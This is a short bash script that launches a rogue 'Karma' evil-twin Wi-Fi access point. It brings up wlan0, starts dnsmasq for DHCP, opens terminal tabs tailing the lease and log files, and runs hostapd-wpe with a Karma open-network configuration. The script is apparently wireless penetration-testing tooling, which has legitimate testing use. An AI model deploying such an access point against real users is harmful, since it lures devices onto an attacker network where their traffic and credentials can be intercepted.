#!/bin/bash
# Setup Rouge Karma AP
# give wlan0 an IP of 10.0.0.1

ifconfig wlan0 up
ifconfig wlan0 10.0.0.1/24

# run dhcp server with ips from 10.0.0.3-100
#clear dns leases
echo > /var/lib/misc/dnsmasq.leases

#Kill DNS & Tail on ctrl+c exit
trap "killall dnsmasq; killall tail;" INT
dnsmasq

#Get Window ID
WID=$(xprop -root | grep "_NET_ACTIVE_WINDOW(WINDOW)"| awk '{print $5}')
xdotool windowfocus $WID
xdotool key ctrl+shift+t
wmctrl -i -a $WID

# DHCP logs will be at eviltwin_dsnmasq.log and leases at dnsmasq.leases
sleep 1; xdotool type --delay 1 --clearmodifiers "tail -f /var/lib/misc/dnsmasq.leases";xdotool key Return;
xdotool key ctrl+shift+t
sleep 1; xdotool type --delay 1 --clearmodifiers "tail -f /var/log/eviltwin_dnsmasq.log";xdotool key Return;

#run hostpad with plain config file
./hostapd-wpe -k confs/karma-opn.conf

